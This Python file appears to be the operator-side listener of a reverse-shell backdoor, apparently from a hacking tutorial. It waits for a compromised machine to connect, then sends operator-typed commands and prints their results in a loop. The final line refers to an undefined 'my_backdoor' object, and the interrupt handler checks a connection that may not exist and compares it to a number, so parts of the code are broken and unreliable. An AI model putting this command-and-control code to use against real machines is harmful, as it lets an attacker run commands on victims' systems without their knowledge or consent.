
import socket
import json

class Listener:
    def __init__(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            listener.bind(((ip, port)))
            listener.listen(0)
            print("[+] Waiting for incoming connections")
            self.connection, address = listener.accept()
            print("[+] Got a connection from" + str(address))

        except KeyboardInterrupt:
            print("[+] Detected CTRL + C.....Closing App....Please wait...")
            if self.connection > 2:
                self.connection.close()
            exit()

    def receive_response(self):
        msg = self.connection.recv(1024)
        print(str(msg))

    def close_connection(self):
        self.connection.close()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:    
                json_data = json_data + self.connection.recv(1460)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remote_command(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        stats = self.reliable_receive()
        print(stats)
        while True:
            try:
                command = input(">> ")
                command = command.split(" ")
                result = self.execute_remote_command(command)
                print(result)

            except json.JSONDecodeError:
                pass

            except KeyboardInterrupt:
                print("[+] Detected CTRL + C.....Closing App....Please wait...")
                self.connection.close()
                exit()

# class end
my_listener = Listener("127.0.0.1", 4490)
my_listener.run()
my_backdoor.close_connection()
    